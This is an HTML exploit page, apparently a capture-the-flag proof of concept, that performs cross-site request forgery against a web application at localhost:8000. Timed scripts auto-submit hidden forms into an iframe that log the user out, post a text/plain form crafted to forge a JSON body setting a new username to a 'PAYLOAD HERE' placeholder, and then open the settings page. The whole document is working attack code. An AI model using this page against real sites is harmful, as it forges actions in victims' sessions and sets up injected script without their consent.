<!DOCTYPE html>
<html>
<body>

  <iframe name="worker" id="worker" src="http://localhost:8000/#/sheets"></iframe>

  <form id="f_logout" target="worker"
        action="http://localhost:8000/api/logout"
        method="GET">
  </form>

  <form id="f_whoami" target="worker"
        action="http://localhost:8000/api/whoami"
        method="POST"
        enctype="text/plain">
    <input name='{"new_username":"PAYLOAD' value='HERE"}'>
  </form>

  <form id="f_settings" target="worker"
        action="http://localhost:8000/#/settings"
        method="GET">
  </form>

  <script>
    setTimeout(function() {
      document.getElementById('f_logout').submit();

      setTimeout(function() {
        document.getElementById('f_whoami').submit();

        setTimeout(function() {
          document.getElementById('f_settings').submit();
        }, 2000);
      }, 2000);
    }, 3000);
  </script>

</body>
</html>
